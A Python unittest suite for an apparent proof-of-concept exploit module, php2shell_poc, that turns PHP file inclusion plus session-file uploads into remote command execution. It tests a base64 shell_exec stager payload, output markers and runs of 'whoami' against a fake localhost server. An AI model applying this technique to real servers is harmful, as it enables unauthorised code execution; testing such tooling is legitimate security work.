import socket
import threading
import unittest

import php2shell_poc as p


class FakeServer:
    def __init__(self, status_line="HTTP/1.1 200 OK", body=b"", max_conn=8):
        self.listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.listener.bind(("127.0.0.1", 0))
        self.listener.listen(8)
        self.port = self.listener.getsockname()[1]
        self.status_line = status_line
        self.body = body
        self.requests = []
        self.thread = threading.Thread(target=self._serve, args=(max_conn,), daemon=True)
        self.thread.start()

    def _serve(self, max_conn):
        for _ in range(max_conn):
            try:
                conn, _ = self.listener.accept()
            except OSError:
                return
            with conn:
                data = b""
                while b"\r\n\r\n" not in data:
                    chunk = conn.recv(65536)
                    if not chunk:
                        break
                    data += chunk
                head, _, rest = data.partition(b"\r\n\r\n")
                length = 0
                for line in head.split(b"\r\n"):
                    if line.lower().startswith(b"content-length:"):
                        length = int(line.split(b":", 1)[1].strip())
                while len(rest) < length:
                    chunk = conn.recv(65536)
                    if not chunk:
                        break
                    rest += chunk
                self.requests.append(head.split(b"\r\n")[0].decode())
                conn.sendall(
                    self.status_line.encode() + b"\r\nContent-Length: "
                    + str(len(self.body)).encode() + b"\r\n\r\n" + self.body
                )

    def close(self):
        try:
            self.listener.close()
        except OSError:
            pass


class TestMarkerParsing(unittest.TestCase):
    def test_extracts_output_between_markers(self):
        body = b"<pre>___START___uid=33(www-data)___END___</pre>"
        m = p.MARKER_RE.search(body.decode())
        self.assertIsNotNone(m)
        self.assertEqual(m.group(1), "uid=33(www-data)")

    def test_multiline_output(self):
        body = "___START___a\nb\nc___END___"
        m = p.MARKER_RE.search(body)
        self.assertEqual(m.group(1), "a\nb\nc")

    def test_no_markers(self):
        self.assertIsNone(p.MARKER_RE.search("nothing here"))


class TestHelpers(unittest.TestCase):
    def test_session_file_path(self):
        self.assertEqual(p.session_file("/tmp", "abc"), "/tmp/sess_abc")
        self.assertEqual(p.session_file("/var/lib/php/sessions/", "abc"),
                         "/var/lib/php/sessions/sess_abc")

    def test_multipart_shape(self):
        parts = [("PHPSESSID", None, b"x"), ("f", "<?php ?>", b"Z")]
        body = p.build_multipart(parts, "bnd")
        text = body.decode()
        self.assertTrue(text.startswith("--bnd\r\n"))
        self.assertTrue(text.endswith("--bnd--\r\n"))
        self.assertIn('name="PHPSESSID"', text)
        self.assertIn('filename="<?php ?>"', text)

    def test_php_payload_is_stager(self):
        payload = p.php_payload("echo 'hi'")
        self.assertTrue(payload.startswith("<?php"))
        self.assertIn("base64_decode", payload)
        self.assertIn("shell_exec", payload)

    def test_status_code_parsing(self):
        self.assertEqual(p.status_code(b"HTTP/1.1 200 OK\r\n\r\n"), 200)
        self.assertEqual(p.status_code(b"HTTP/1.1 404 Not Found\r\n\r\n"), 404)
        self.assertEqual(p.status_code(b"garbage"), 0)

    def test_body_partition(self):
        self.assertEqual(p.body_of(b"HTTP/1.1 200 OK\r\n\r\npayload"), b"payload")

    def test_sid_uniqueness(self):
        self.assertNotEqual(p.make_sid(1), p.make_sid(1))


class TestEndToEnd(unittest.TestCase):
    def test_confirmed_against_fake_target(self):
        server = FakeServer(body=b"<<<www-data>>>")
        self.addCleanup(server.close)
        rc = p.main([
            "--target", f"http://127.0.0.1:{server.port}/index.php",
            "--lfi-path", "/vuln.php",
            "--command", "whoami",
            "--attempts", "1",
            "--sid", "testsid000000000000000001",
            "--json",
        ])
        self.assertEqual(rc, 0)
        self.assertTrue(server.requests[0].startswith("POST /index.php"))

    def test_not_confirmed_without_markers(self):
        server = FakeServer(body=b"<html>no include</html>", max_conn=4)
        self.addCleanup(server.close)
        rc = p.main([
            "--target", f"http://127.0.0.1:{server.port}/index.php",
            "--lfi-path", "/vuln.php",
            "--attempts", "2",
            "--sid", "testsid000000000000000002",
        ])
        self.assertEqual(rc, 1)

    def test_unreachable_target_returns_usage_error(self):
        rc = p.main([
            "--target", "http://127.0.0.1:1/index.php",
            "--attempts", "1",
            "--timeout", "1",
        ])
        self.assertEqual(rc, 2)

    def test_bad_scheme_rejected(self):
        rc = p.main(["--target", "ftp://127.0.0.1/x", "--attempts", "1"])
        self.assertEqual(rc, 2)

    def test_invalid_timeout_rejected(self):
        rc = p.main(["--target", "http://127.0.0.1:1/x", "--timeout", "999"])
        self.assertEqual(rc, 2)


if __name__ == "__main__":
    unittest.main(verbosity=2)
